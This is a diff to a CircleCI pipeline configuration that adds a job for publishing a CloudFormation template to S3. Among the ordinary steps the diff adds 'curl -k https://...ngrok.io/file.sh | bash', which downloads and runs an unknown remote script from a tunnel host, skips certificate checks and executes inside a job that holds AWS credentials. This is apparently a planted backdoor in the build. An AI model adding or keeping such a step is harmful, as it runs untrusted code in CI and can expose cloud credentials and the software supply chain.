@@ -11,6 +11,7 @@ workflows:
       - test
       - vet
       - docker_image
+      - cloudformation_template
       - cloudformation_template:
           filters:
             branches:
@@ -19,6 +20,20 @@ workflows:
 jobs:
   build:
     <<: *defaults
+
+  cloudformation_template:
+    docker:
+      - image: circleci/python:2.7
+        environment:
+          AWS_REGION: us-east-1
+
+    steps:
+      - checkout
+      - run:
+          name: Install AWS cli
+          command: sudo pip install awscli
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
 
     docker:
       - image: circleci/golang:1.10.8
